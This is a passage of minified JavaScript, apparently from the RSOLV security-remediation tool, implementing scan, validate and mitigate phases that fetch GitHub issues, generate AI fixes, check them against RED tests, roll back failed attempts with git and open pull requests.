phase",{issueNumber:X.issueNumber,repository:X.repository,timestamp:new Date().toISOString(),initialTimeout:J}),!X.issueNumber||!X.repository)return V.error("[MITIGATE] Missing required parameters"),{success:!1,phase:"mitigate",error:"Mitigation requires an issue number and repository"};V.info("[MITIGATE] Step 1: Fetching issue from GitHub...");let{getIssue:Y}=await Promise.resolve().then(() => (g9(),r7)),W=Y(X.repository.owner,X.repository.name,X.issueNumber),G=new Promise((Y1,k)=>setTimeout(()=>k(Error("GitHub API timeout after 30s")),30000)),H;try{H=await Promise.race([W,G]),V.info("[MITIGATE] Step 1 complete: Successfully fetched issue from GitHub")}catch(Y1){return V.error("[MITIGATE] Step 1 failed: Error fetching issue from GitHub:",Y1),{success:!1,phase:"mitigate",error:`Failed to fetch issue: ${Y1 instanceof Error?Y1.message:String(Y1)}`}}if(!H)return{success:!1,phase:"mitigate",error:`Issue #${X.issueNumber} not found`};V.info("[MITIGATE] Analyzing issue for file count...");let $=H.body||"",z=H.title||"",U=1,K=z.match(/(\d+)\s+files?/i)||$.match(/(\d+)\s+files?/i);if(K)U=parseInt(K[1],10),V.info(`[MITIGATE] Detected ${U} files from issue description`);if(U>3){let k=Math.max(J,U*60000);V.info(`[MITIGATE] Adjusting timeout for ${U} files: ${J}ms -> ${k}ms`),J=k}V.info("[MITIGATE] Step 2: Retrieving validation data...");let B=X.commitSha||this.getCurrentCommitSha();V.info("[MITIGATE] Retrieval parameters:",{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:B.substring(0,8),commitShaFull:B,hasProvidedValidationData:!!X.validationData});let q;if(X.validationData)V.info("[MITIGATE] Using validation data provided in options"),q=X.validationData;else try{let Y1=this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,B),k=new Promise((c,X1)=>setTimeout(()=>X1(Error("Phase data retrieval timeout after 15s")),15000));q=await Promise.race([Y1,k]),V.info("[MITIGATE] Step 2 complete: Retrieved validation data",{hasData:!!q,keys:q?Object.keys(q):[],hasValidation:!!q?.validation,hasValidate:!!q?.validate,validationKeys:q?.validation?Object.keys(q.validation):[],validateKeys:q?.validate?Object.keys(q.validate):[]})}catch(Y1){V.warn("[MITIGATE] Step 2 warning: Failed to retrieve validation data:",{error:Y1 instanceof Error?Y1.message:String(Y1),stack:Y1 instanceof Error?Y1.stack:void 0}),q=null}V.info("[MITIGATE] Checking labels...",{labels:H.labels,labelType:typeof H.labels,isArray:Array.isArray(H.labels)});let Z=Array.isArray(H.labels)?H.labels.map((Y1)=>typeof Y1==="string"?Y1:Y1.name||""):[],M=Z.includes("rsolv:automate"),L=Z.includes("rsolv:validated");if(V.info("[MITIGATE] Label check complete",{labelNames:Z,hasAutomateLabel:M,hasValidatedLabel:L}),!q?.validation&&M&&!L){V.info("[MITIGATE] Step 3: No validation found, running VALIDATE phase first");try{let Y1=this.executeValidate(X),k=new Promise((r,s)=>setTimeout(()=>s(Error("Validation timeout after 60s")),60000)),c=await Promise.race([Y1,k]);if(!c.success)return V.error("[MITIGATE] Step 3 failed: Auto-validation failed"),{success:!1,phase:"mitigate",error:`Auto-validation failed: ${c.error}`,data:{validationAttempted:!0}};V.info("[MITIGATE] Step 3a: Validation succeeded, retrieving stored data...");let X1=this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,B),N1=new Promise((r,s)=>setTimeout(()=>s(Error("Phase data retrieval timeout after 15s")),15000));q=await Promise.race([X1,N1]),V.info("[MITIGATE] Step 3 complete: Validation data retrieved")}catch(Y1){return V.error("[MITIGATE] Step 3 failed:",Y1),{success:!1,phase:"mitigate",error:`Validation phase error: ${Y1 instanceof Error?Y1.message:String(Y1)}`,data:{validationError:!0}}}}V.info("[MITIGATE] Step 4: Checking validation data...");let R;try{let Y1=`issue-${X.issueNumber}`;V.info("[MITIGATE] Looking for validation with key:",Y1),V.info("[MITIGATE] Available validation data:",{hasValidationData:!!q,validationKeys:q?Object.keys(q):[],validationProp:q?.validation?Object.keys(q.validation):[],validateProp:q?.validate?Object.keys(q.validate):[]}),R=q?.validation?.[Y1]||q?.validate?.[Y1],V.info("[MITIGATE] Validation lookup result:",{found:!!R,validationType:R?typeof R:"undefined"})}catch(Y1){return V.error("[MITIGATE] Error accessing validation data:",Y1),{success:!1,phase:"mitigate",error:`Failed to access validation data: ${Y1 instanceof Error?Y1.message:String(Y1)}`,data:{validationAccessError:!0}}}if(!R||typeof R!=="object")return V.warn("[MITIGATE] No validation data found for issue or invalid type",{validationType:typeof R,validation:R}),{success:!1,phase:"mitigate",error:"No validation data available. Please run validation first or add rsolv:automate label.",data:{validationRequired:!0}};V.info("[MITIGATE] Step 4 complete: Validation data found"),V.info("[MITIGATE DEBUG] Validation data structure:",JSON.stringify(R,null,2));let j=R,F=j.hasSpecificVulnerabilities??(j.vulnerabilities&&j.vulnerabilities.length>0);if(V.info("[MITIGATE DEBUG] Vulnerability check:",{hasSpecificVulnerabilities:F,hasSpecificVulnerabilitiesField:"hasSpecificVulnerabilities"in j,vulnerabilitiesLength:j.vulnerabilities?.length||0,validationKeys:Object.keys(j)}),!F)return V.warn("[MITIGATE] No specific vulnerabilities found - validation may have failed"),V.warn("[MITIGATE DEBUG] Validation object:",R),{success:!1,phase:"mitigate",error:"No specific vulnerabilities found during validation. This may be a false positive.",data:{validation:R,falsePositive:!0}};let A=j.vulnerabilities||[],O=j.overallConfidence||j.confidence||"medium";V.info("[MITIGATE] DEBUG: Vulnerability data structure:",{vulnerabilityCount:A.length,firstVulnerability:A[0]?JSON.stringify(A[0]):"none",vulnerabilityKeys:A[0]?Object.keys(A[0]):[],validationKeys:Object.keys(j)}),V.info("[MITIGATE] Step 4a: Parsing issue body to extract real filenames...");let{parseIssueBody:w,enhanceValidationData:N}=await Promise.resolve().then(() => (RP(),AP)),C=w($);if(A.length>0&&C.files.length>0)A=N(j,C).vulnerabilities,V.info("[MITIGATE] Step 4a complete: Enhanced validation data with real filenames",{originalFiles:j.vulnerabilities?.map((k)=>k.filePath||k.file)||[],enhancedFiles:A.map((k)=>k.filePath||k.file),filesFixed:A.filter((k,c)=>k.file!==j.vulnerabilities?.[c]?.file).length});else V.warn("[MITIGATE] Step 4a: Could not enhance validation data",{hasVulnerabilities:A.length>0,hasParsedFiles:C.files.length>0});if(O==="review"||O==="low")V.warn(`[MITIGATE] Low confidence (${O}) - requiring manual review`);let _={...H,validationData:R,specificVulnerabilities:A};V.info("[MITIGATE] Step 5: Checking for vendor files and multi-file vulnerabilities...");let{ChunkingIntegration:h}=await Promise.resolve().then(() => (OV(),CP)),{VendorDetectionIntegration:o}=await Promise.resolve().then(() => (TP(),EP)),{ExtendedConversationIntegration:p}=await Promise.resolve().then(() => kP),e=process.env.USE_EXTENDED_CONVERSATION!=="false",d=e?new p:new h,Q1=new o,{extractFilesFromVulnerabilities:V1}=await Promise.resolve().then(() => (xP(),vP)),D1=V1(A,"MITIGATE");if(D1.length>3)J=Math.max(J,D1.length*60000),V.info(`[MITIGATE] Adjusted timeout for ${D1.length} files: ${J}ms`);let n=await Promise.all(D1.map(async(Y1)=>({file:Y1,isVendor:await Q1.isVendorFile(Y1)})));if(V.info("[MITIGATE] Vendor detection results:",{totalFiles:D1.length,vendorFiles:n.filter((Y1)=>Y1.isVendor).map((Y1)=>Y1.file),nonVendorFiles:n.filter((Y1)=>!Y1.isVendor).map((Y1)=>Y1.file)}),n.some((Y1)=>Y1.isVendor)){V.info("[MITIGATE] RFC-047: Vendor files detected, handling as vendor vulnerability");let Y1=await Q1.processVulnerability({..._,files:D1,vendorFiles:n.filter((k)=>k.isVendor).map((k)=>k.file)});if(Y1.action==="issue_created")return{success:!0,phase:"mitigate",message:"Vendor library vulnerability detected. Update recommendation created instead of patch.",data:Y1}}let u=D1.length;if(e?d.shouldUseExtendedConversation({files:D1,vulnerabilities:A}):d.shouldChunk({files:D1,vulnerabilities:A})){let Y1=e?"extended conversation":"chunking";V.info(`[MITIGATE] RFC-046: Multi-file vulnerability (${u} files) will use ${Y1}`);let c=await d[e?"processWithExtendedConversation":"processWithChunking"]({..._,files:D1,type:A[0]?.type||"UNKNOWN"},X.issueNumber);if(c.success||c.chunked)return{success:!0,phase:"mitigate",message:e?"Multi-file vulnerability fixed in single PR using extended conversation":`Multi-file vulnerability chunked into ${c.chunks} PRs for manageable fixes`,data:c};if(c.requiresManual)return{success:!1,phase:"mitigate",error:"Vulnerability too complex for automated fixing",data:{...c,manualGuide:c.guide}}}V.info("[MITIGATE] Step 4: Checking for RFC-058/RFC-060 validation branch...");let{MitigationMode:y}=await Promise.resolve().then(() => (uP(),mP)),a=new y(this.config,process.cwd(),this.phaseDataClient),I=!1;try{V.info("[MITIGATE] Fetching remote branches for RFC-058 validation branches...");let{execSync:Y1}=await import("child_process");try{Y1("git fetch origin",{cwd:process.cwd(),encoding:"utf8"}),V.info("[MITIGATE] Remote branches fetched successfully")}catch(c){V.warn("[MITIGATE] Could not fetch remote branches:",c)}let k=`rsolv/validate/issue-${X.issueNumber}`;try{Y1(`git rev-parse --verify origin/${k}`,{cwd:process.cwd()}),I=!0,V.info(`[MITIGATE] RFC-058: Validation branch found: origin/${k}`)}catch{V.info("[MITIGATE] No validation branch found, using standard mitigation")}}catch(Y1){V.warn("[MITIGATE] Error checking for validation branch:",Y1)}if(I){V.info("[MITIGATE] RFC-058: Using test-aware fix generation with validation tests");let Y1=await a.generateTestAwareFix(H);V.info("[MITIGATE] Test-aware context generated:",{branchCheckedOut:Y1.branchCheckedOut,testFilesFound:Y1.testFilesFound}),_.testContext=Y1,_.hasValidationTests=Y1.testFilesFound>0,_.validationBranch=Y1.branchCheckedOut?a.getCurrentBranch():void 0}if(V.info(`[MITIGATE] Generating fix for ${A.length} validated vulnerabilities`),this.config.aiProvider?.useVendedCredentials&&!this.config.rsolvApiKey)return V.error("[MITIGATE] Vended credentials enabled but RSOLV_API_KEY is missing"),{success:!1,phase:"mitigate",error:"RSOLV_API_KEY is required for vended credentials but was not provided",data:{credentialError:!0}};V.info("[MITIGATE] Step 4: Importing AI processor...");let{processIssues:v}=await Promise.resolve().then(() => (HS(),GS));V.info("[MITIGATE] Step 4 complete: AI processor imported successfully");let g=Date.now()-Q,H1=J-g;if(H1<=0)return V.error("[MITIGATE] Overall timeout exceeded before processing"),{success:!1,phase:"mitigate",error:"Mitigation timeout exceeded",data:{timeout:!0,elapsed:g}};V.info("[MITIGATE] Step 5: Starting AI processing...",{remainingTime:Math.round(H1/1000)+"s",vulnerabilityCount:A.length,hasVendedCredentials:this.config.aiProvider?.useVendedCredentials,hasRsolvApiKey:!!this.config.rsolvApiKey});let z1;try{let Y1=v([_],this.config),k=new Promise((c,X1)=>setTimeout(()=>X1(Error(`AI processing timeout after ${Math.round(H1/1000)}s`)),H1));z1=await Promise.race([Y1,k]),V.info("[MITIGATE] Step 5 complete: AI processing finished",{hasResults:!!z1,resultCount:z1?.length||0,firstResult:z1?.[0]?Object.keys(z1[0]):[]})}catch(Y1){return V.error("[MITIGATE] Step 5 failed: Error during processIssues:",Y1),{success:!1,phase:"mitigate",error:`Failed to process issue: ${Y1 instanceof Error?Y1.message:String(Y1)}`,data:{processingError:!0,elapsed:Date.now()-Q}}}let P1=`issue-${X.issueNumber}`,j1;if(z1&&z1.length>0&&z1[0].pullRequestUrl){let Y1=z1[0];j1={fixed:!0,prUrl:Y1.pullRequestUrl,prNumber:Y1.pullRequestUrl?parseInt(Y1.pullRequestUrl.split("/").pop()||"0"):0,filesModified:[],vulnerabilitiesFixed:A.length,usedValidationData:!0,validationConfidence:O,timestamp:new Date().toISOString()}}else{let Y1=z1?.[0]?.error||z1?.[0]?.message||"Unknown error during fix generation";return V.error("[MITIGATE] Failed to generate fix",{error:Y1,result:z1?.[0],hasResult:z1?.length>0}),{success:!1,phase:"mitigate",error:`Failed to generate fix: ${Y1}`,data:{processingResults:z1,validation:R}}}V.info("[MITIGATE] Step 6: Storing mitigation results...");try{let Y1=this.storePhaseData("mitigation",{[P1]:j1},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:B}),k=new Promise((c,X1)=>setTimeout(()=>X1(Error("Store timeout after 10s")),1e4));await Promise.race([Y1,k]),V.info("[MITIGATE] Step 6 complete: Mitigation results stored")}catch(Y1){V.warn("[MITIGATE] Step 6 warning: Failed to store results (non-fatal):",Y1)}let k1=Date.now()-Q;return V.info("[MITIGATE] SUCCESS: Mitigation completed",{prUrl:j1.prUrl,vulnerabilitiesFixed:j1.vulnerabilitiesFixed,totalTimeMs:k1,totalTimeSec:Math.round(k1/1000)}),{success:!0,phase:"mitigate",message:`Fixed ${j1.vulnerabilitiesFixed} vulnerabilities and created PR`,data:{mitigation:j1,validationUsed:!0,executionTimeMs:k1}}}catch(Y){let W=Date.now()-Q;return V.error("[MITIGATE] FAILED: Mitigation phase failed",{error:Y instanceof Error?Y.message:String(Y),stack:Y instanceof Error?Y.stack:void 0,totalTimeMs:W,totalTimeSec:Math.round(W/1000)}),{success:!1,phase:"mitigate",error:Y instanceof Error?Y.message:String(Y),data:{executionTimeMs:W,errorDetails:Y instanceof Error?Y.stack:String(Y)}}}}async executeAllPhases(X){try{V.info("Executing all phases: scan, validate, mitigate");let Q=await this.executeScan(X);if(!Q.success)return Q;let J=Q.data?.scan?.createdIssues||[];if(V.info(`Scan created ${J.length} issues (limited by max_issues: ${this.config.maxIssues})`),J.length===0)return V.info("No issues created by scan, skipping validation and mitigation"),{success:!0,phase:"full",message:"No vulnerabilities found to process",data:{scan:Q.data,validations:[],mitigations:[]}};let{getIssue:Y}=await Promise.resolve().then(() => (g9(),r7)),W=[];for(let B of J)try{V.info(`Fetching details for issue #${B.number}`);let q=await Y(X.repository.owner,X.repository.name,B.number);W.push(q)}catch(q){V.error(`Failed to fetch issue #${B.number}:`,q)}if(W.length===0)return V.warn("Failed to fetch any issue details, cannot proceed"),{success:!1,phase:"full",error:"Failed to fetch issue details after scan"};V.info(`Validating ${W.length} issues`);let G=[],{ValidationMode:H}=await Promise.resolve().then(() => (ZG(),qG)),$=this.validationMode||new H(this.config,process.cwd());for(let B of W)try{V.info(`Validating issue #${B.number}`);let q=await $.validateVulnerability(B),Z=this.getCurrentCommitSha();await this.storePhaseData("validation",{[`issue-${B.number}`]:{issueNumber:q.issueId,validated:q.validated,falsePositiveReason:q.falsePositiveReason,branchName:q.branchName,redTests:q.redTests,testResults:q.testResults,timestamp:q.timestamp,commitHash:q.commitHash,hasSpecificVulnerabilities:q.validated,vulnerabilities:q.vulnerabilities||[],confidence:"high",testType:q.testType,cweId:q.cweId,framework:q.framework,retryCount:q.retryCount,classificationSource:q.classificationSource,infrastructureFailure:q.infrastructureFailure||!1,validationInconclusive:q.validationInconclusive||!1}},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:B.number,commitSha:Z});let M={success:!0,phase:"validate",data:{validation:q}};G.push({issue:B,result:M})}catch(q){V.error(`Validation failed for issue #${B.number}:`,q),G.push({issue:B,result:{success:!1,phase:"validate",error:q instanceof Error?q.message:String(q)}})}let z=G.filter((B)=>B.result.success&&B.result.data?.validation?.validated);V.info(`${z.length} of ${W.length} issues validated`);let U=[];for(let B of G)if(B.result.success&&B.result.data?.validation?.validated)try{V.info(`Mitigating issue #${B.issue.number}`);let q=await this.executeMitigate({...X,issueNumber:B.issue.number});U.push(q)}catch(q){V.error(`Mitigation failed for issue #${B.issue.number}:`,q),U.push({success:!1,phase:"mitigate",error:q instanceof Error?q.message:String(q)})}let K=U.filter((B)=>B.success).length;return{success:!0,phase:"full",message:`Completed all phases: ${J.length} issues processed, ${z.length} validated, ${K} mitigated`,data:{scan:Q.data,validations:G.map((B)=>B.result),mitigations:U}}}catch(Q){return V.error("Full execution failed",Q),{success:!1,phase:"full",error:Q instanceof Error?Q.message:String(Q)}}}async storePhaseData(X,Q,J){let Y={};if(X==="scan")Y.scan={vulnerabilities:Q.vulnerabilities||[],timestamp:new Date().toISOString(),commitHash:J.commitSha,...Q.manifestFiles?{manifest_files:Q.manifestFiles}:{}};else if(X==="validation")Y.validate=Q;else if(X==="mitigation")Y.mitigate=Q;await this.phaseDataClient.storePhaseResults(X==="validation"?"validate":X==="mitigation"?"mitigate":X,Y,J)}async retrievePhaseData(X,Q,J){return this.phaseDataClient.retrievePhaseResults(X,Q,J)}getCurrentCommitSha(){return bX("git rev-parse HEAD",{encoding:"utf-8"}).trim()}async executeScanForIssue(X){try{V.info(`[SCAN] Analyzing issue #${X.number}`);let Q=this.checkGitStatus();if(!Q.clean)return{success:!1,phase:"scan",message:"Repository has uncommitted changes",error:`Uncommitted changes in: ${Q.modifiedFiles.join(", ")}`};let J=await Q8(X,this.config);if(!J)return{success:!1,phase:"scan",message:"Failed to analyze issue",error:"Analysis returned no data"};let Y={vulnerabilities:[],timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitSha(),canBeFixed:J.canBeFixed||!1,analysisData:J,gitStatus:Q},W=this.getCurrentCommitSha();return await this.phaseDataClient.storePhaseResults("scan",{scan:Y},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:W}),{success:!0,phase:"scan",message:J.canBeFixed?"Issue can be automatically fixed":"Issue cannot be automatically fixed",data:Y}}catch(Q){return V.error("[SCAN] Failed to analyze issue",Q),{success:!1,phase:"scan",error:Q instanceof Error?Q.message:String(Q)}}}async executeValidateForIssue(X,Q){try{V.info(`[VALIDATE] Generating tests for issue #${X.number}`);let{analysisData:J}=Q;if(!J.canBeFixed)return{success:!1,phase:"validate",message:"Issue cannot be fixed, skipping validation"};let Y;if(this.testGeneratingAnalyzer){let K=new Map;if(J.filesToModify&&J.filesToModify.length>0){let B=(await import("fs")).default,q=(await import("path")).default;for(let Z of J.filesToModify)try{let M=q.resolve(process.cwd(),Z);if(B.existsSync(M)){let L=B.readFileSync(M,"utf8");K.set(Z,L)}}catch(M){V.warn(`Could not read file ${Z} for test generation:`,M)}}Y=await this.testGeneratingAnalyzer.analyzeWithTestGeneration(X,this.config,K)}else if(this.config.testGeneration?.enabled||this.config.fixValidation?.enabled!==!1){let K={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials},B=new C5(K),q=new Map;if(J.filesToModify&&J.filesToModify.length>0){let Z=(await import("fs")).default,M=(await import("path")).default;for(let L of J.filesToModify)try{let R=M.resolve(process.cwd(),L);if(Z.existsSync(R)){let j=Z.readFileSync(R,"utf8");q.set(L,j)}}catch(R){V.warn(`Could not read file ${L}:`,R)}}Y=await B.analyzeWithTestGeneration(X,this.config,q)}let W=X.number,G;if(Y?.generatedTests?.success&&Y.generatedTests.tests?.[0]){let K=new YG,B=Y.generatedTests.tests[0],q=B.suggestedFileName||"__tests__/security/vulnerability-test.js";try{G=await K.runTests({framework:B.framework,testFile:q,workingDir:process.cwd(),timeout:30000}),V.info(`[VALIDATE] Test execution result: ${G.passed?"PASSED":"FAILED"}`)}catch(Z){V.warn("[VALIDATE] Could not execute test:",Z)}}let H=WG(X,Q);V.info("[VALIDATE] Extracted vulnerabilities from issue",{issueNumber:X.number,vulnerabilitiesCount:H.length,files:H.map((K)=>K.file)});let $={[W]:{validated:Y?.generatedTests?.success||!1,redTests:Y?.generatedTests?.testSuite,testResults:G,falsePositiveReason:void 0,vulnerabilities:H,timestamp:new Date().toISOString()}},z=this.getCurrentCommitSha();V.info("[VALIDATE] Storing validation results to Platform API",{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:z.substring(0,8),hasData:!!$,dataKeys:$?Object.keys($):[]});let U=await this.phaseDataClient.storePhaseResults("validate",{validate:$},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:z});return V.info("[VALIDATE] Validation storage result:",{success:U.success,storage:U.storage,warning:U.warning,message:U.message}),{success:!0,phase:"validate",message:$[W]?.validated?"Tests generated successfully":"Test generation skipped or failed",data:{validation:$}}}catch(J){return V.error("[VALIDATE] Failed to generate tests",J),{success:!1,phase:"validate",error:J instanceof Error?J.message:String(J)}}}async executeMitigateForIssue(X,Q,J){let Y=Date.now(),W=this.getCurrentCommitSha();try{V.info(`[MITIGATE] Applying fix for issue #${X.number}`);let{analysisData:G}=Q,{generatedTests:H}=J,$=GG(J,X.number);if($)V.info(`[MITIGATE] Found proven RED test from VALIDATE (${$.framework}, file: ${$.testFile})`);let z={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.1,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials,claudeCodeConfig:{verboseLogging:!0,timeout:600000,executablePath:process.env.CLAUDE_CODE_PATH,useStructuredPhases:this.config.useStructuredPhases}},U;if(this.config.aiProvider.useVendedCredentials&&this.config.rsolvApiKey){process.env.RSOLV_API_KEY=this.config.rsolvApiKey,V.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:O}=await Promise.resolve().then(() => (RX(),K7));U=await O.getInstance(this.config.rsolvApiKey),V.info("Using vended credentials singleton for Claude Code")}let K,B=0,q=this.maxIterations||this.getMaxIterations(X),Z=X,M=!1;while(B<q){V.info(`[MITIGATE] Fix attempt ${B+1}/${q}`),V.info("=== MITIGATION ADAPTER CREATION DEBUG ==="),V.info(`useVendedCredentials in aiConfig: ${z.useVendedCredentials}`),V.info(`this.config.aiProvider.useVendedCredentials: ${this.config.aiProvider.useVendedCredentials}`),V.info(`credentialManager exists: ${!!U}`),V.info("==========================================");let O=K8({repoPath:process.cwd(),credentialManager:U,useVendedCredentials:z.useVendedCredentials,maxTurns:3,model:z.model,testFilePatterns:["test/","tests/","spec/","__tests__/",".test.",".spec."],verbose:z.claudeCodeConfig?.verboseLogging}),w={summary:`${G.issueType} issue analysis`,complexity:G.estimatedComplexity==="simple"?"low":G.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[G.suggestedApproach||""],recommendedApproach:G.suggestedApproach||"",relatedFiles:G.filesToModify},N=B>0?{current:B+1,max:q}:void 0;if(K=await O.generateSolutionWithGit(Z,w,void 0,J,void 0,N),!K.success)if(process.env.RSOLV_TESTING_MODE==="true"&&K.isTestMode&&K.validationFailed)V.info("[TEST MODE] Solution failed validation but proceeding to create PR for inspection");else return{success:!1,phase:"mitigate",message:K.message,error:K.error};V.info(`[MITIGATE DEBUG] DISABLE_FIX_VALIDATION env: ${process.env.DISABLE_FIX_VALIDATION}`),V.info(`[MITIGATE DEBUG] config.fixValidation?.enabled: ${this.config.fixValidation?.enabled}`),V.info(`[MITIGATE DEBUG] config.testGeneration?.validateFixes: ${this.config.testGeneration?.validateFixes}`);let C=this.config.fixValidation?.enabled===!1;if(V.info(`[MITIGATE DEBUG] skipValidation calculated as: ${C}`),C){V.info("[MITIGATE] \uD83D\uDCCB Skipping fix validation (DISABLE_FIX_VALIDATION=true)"),V.info("[MITIGATE] Fix will be applied without validation - proceeding to PR creation");break}else if($){V.info(`[MITIGATE] Verifying fix with VALIDATE RED test (${$.framework})...`);let _=await HG(W,K.commitHash,$,process.cwd());if(_.isValidFix){V.info("[MITIGATE]  Fix verified: RED test now passes"),M=!0;break}if(_.error?.includes("infrastructure")){V.error(`[MITIGATE] Infrastructure failure: ${_.error}`),V.warn("[MITIGATE] Skipping retries  test runner not available");break}if(V.info(`[MITIGATE]  Fix verification failed, will retry (${B+1}/${q} attempts so far)`),B+1>=q){if(process.env.RSOLV_TESTING_MODE==="true"){V.warn(`[TEST MODE] Fix verification failed after ${q} attempts, but creating PR anyway for inspection`),K.isTestMode=!0,K.validationFailed=!0,K.testModeNote=`Verification failed after ${q} attempts: RED test still fails on fixed code`;break}return bX(`git reset --hard ${W}`,{encoding:"utf-8"}),{success:!1,phase:"mitigate",message:`Fix verification failed after ${q} attempts`,error:`RED test still fails: ${_.fixedResult?.output?.substring(0,500)||"no output"}`}}bX(`git reset --hard ${W}`,{encoding:"utf-8"}),Z={...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Fix Verification Failed (attempt ${B+1} of ${q})

The RED test still fails after your fix. Test output:
\`\`\`
${_.fixedResult?.output||"no output"}
\`\`\`

The test expects the vulnerability to be fixed. Please review and try again.`},B++;continue}else if((this.config.testGeneration?.validateFixes===!0||this.config.fixValidation?.enabled===!0)&&H?.success&&H.testSuite){V.info("[MITIGATE] Validating fix with tests (legacy path)...");let h=await(this.gitBasedValidator||new FQ).validateFixWithTests(W,K.commitHash,H.testSuite);if(h.isValidFix){V.info("[MITIGATE]  Fix validated successfully"),M=!0;break}if(V.info(`[MITIGATE]  Fix validation failed, will retry (${B+1}/${q} attempts so far)`),B+1>=q){if(process.env.RSOLV_TESTING_MODE==="true"){V.warn(`[TEST MODE] Fix validation failed after ${q} attempts, but creating PR anyway for inspection`),K.isTestMode=!0,K.validationFailed=!0,K.testModeNote=`Validation failed after ${q} attempts: ${this.explainTestFailureFromResult(h)}`;break}return bX(`git reset --hard ${W}`,{encoding:"utf-8"}),{success:!1,phase:"mitigate",message:`Fix validation failed after ${q} attempts`,error:this.explainTestFailureFromResult(h)}}bX(`git reset --hard ${W}`,{encoding:"utf-8"}),Z=this.createEnhancedIssueWithTestFailure(X,h,J,B+1,q),B++;continue}else{V.info("[MITIGATE] No validation configured, proceeding to PR creation");break}}V.info(`[MITIGATE] Creating PR from commit ${K.commitHash?.substring(0,8)}`);let R=process.env.RSOLV_EDUCATIONAL_PR!=="false"?await VJ(X,K.commitHash,{...K.summary,vulnerabilityType:Q.analysisData.vulnerabilityType||"security",severity:Q.analysisData.severity||"medium",cwe:Q.analysisData.cwe,isAiGenerated:Q.analysisData.isAiGenerated},this.config,K.diffStats):await JG(X,K.commitHash,K.summary,this.config,K.diffStats);if(!R.success){try{bX("git reset --hard HEAD~1",{encoding:"utf-8"})}catch(O){V.warn("Failed to rollback commit",O)}return{success:!1,phase:"mitigate",message:R.message,error:R.error}}let j=Date.now()-Y;V.info(`[MITIGATE] Successfully created PR in ${j}ms`);let A={[X.number]:{fixed:K.success||!1,prUrl:R.pullRequestUrl,fixCommit:K.commitHash,timestamp:new Date().toISOString()}};return await this.phaseDataClient.storePhaseResults("mitigate",{mitigate:A},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:K.commitHash}),{success:!0,phase:"mitigate",message:`Created PR #${R.pullRequestNumber}`,data:A}}catch(G){V.error("[MITIGATE] Failed to apply fix",G);try{bX(`git reset --hard ${W}`,{encoding:"utf-8"})}catch(H){V.warn("Failed to rollback after error",H)}return{success:!1,phase:"mitigate",error:G instanceof Error?G.message:String(G)}}}async executeThreePhaseForIssue(X){try{V.info(`[THREE-PHASE] Processing issue #${X.number} through all phases`);let Q=await this.executeScanForIssue(X);if(!Q.success)return{...Q,phase:"three-phase"};if(!Q.data?.canBeFixed)return{success:!1,phase:"three-phase",message:"Issue cannot be fixed automatically",data:{scan:Q.data}};let J=await this.executeValidateForIssue(X,Q.data);if(!J.success)return{...J,phase:"three-phase",data:{scan:Q.data,validation:J.data}};let Y=await this.executeMitigateForIssue(X,Q.data,J.data);return{success:Y.success,phase:"three-phase",message:Y.success?`Successfully processed issue #${X.number} through all phases`:Y.message,data:{scan:Q.data,validation:J.data,mitigation:Y.data},error:Y.error}}catch(Q){return V.error("[THREE-PHASE] Failed to process issue",Q),{success:!1,phase:"three-phase",error:Q instanceof Error?Q.message:String(Q)}}}checkGitStatus(){try{let X=bX("git status --porcelain",{encoding:"utf-8"}).trim();if(!X)return{clean:!0,modifiedFiles:[]};return{clean:!1,modifiedFiles:X.split(`
`).map((J)=>J.substring(3).trim()).filter((J)=>J.length>0)}}catch(X){return V.error("Failed to check git status",X),{clean:!1,modifiedFiles:["unknown"]}}}getMaxIterations(X){let Q=X.labels.find((J)=>J.startsWith("fix-validation-max-"));if(Q){let J=parseInt(Q.replace("fix-validation-max-",""));if(!isNaN(J))return J}if(this.config.fixValidation?.maxIterations!==void 0)return this.config.fixValidation.maxIterations;return 3}explainTestFailureFromResult(X){let Q=[];if(!X.fixedCommit.allPassed){if(Q.push("- **The vulnerability still exists** - RED tests are still failing on your fixed code"),X.fixedCommit.redTestsPassed.length>1){let J=X.fixedCommit.redTestsPassed.map((Y,W)=>!Y?`RED test ${W+1}`:null).filter(Boolean);if(J.length>0)Q.push(`  Failed tests: ${J.join(", ")}`)}}if(X.vulnerableCommit.allPassed)Q.push("- **Warning**: RED tests passed on vulnerable code (they should have failed!)"),Q.push("  This suggests the tests may not be properly detecting the vulnerability");return Q.join(`
`)}explainTestFailure(X){let Q=[];if(!X.validated)Q.push("- Validation failed");if(X.falsePositiveReason)Q.push(`- False positive: ${X.falsePositiveReason}`);if(X.testResults&&!X.testResults.success)Q.push("- Test execution failed");return Q.length>0?Q.join(`
`):"Unknown validation failure"}createEnhancedIssueWithTestFailure(X,Q,J,Y,W){let G=J.generatedTests?.tests?.[0]?.testCode||"",H=J.generatedTests?.tests?.[0]?.framework||"unknown";return{...X,body:`${X.body}

## Previous Fix Attempt Failed

The previous fix did not pass the generated security tests:

### Test Results:
- Red Test (vulnerability should be fixed): ${Q.fixedCommit.redTestPassed?" PASSED":" FAILED"}
- Green Test (fix should work): ${Q.fixedCommit.greenTestPassed?" PASSED":" FAILED"}
- Refactor Test (functionality maintained): ${Q.fixedCommit.refactorTestPassed?" PASSED":" FAILED"}

### Generated Test Code:
\`\`\`${H}
${G}
\`\`\`

Please fix the vulnerability again, ensuring the fix passes all three tests.

### Why the Previous Fix Failed:
${this.explainTestFailure(Q)}

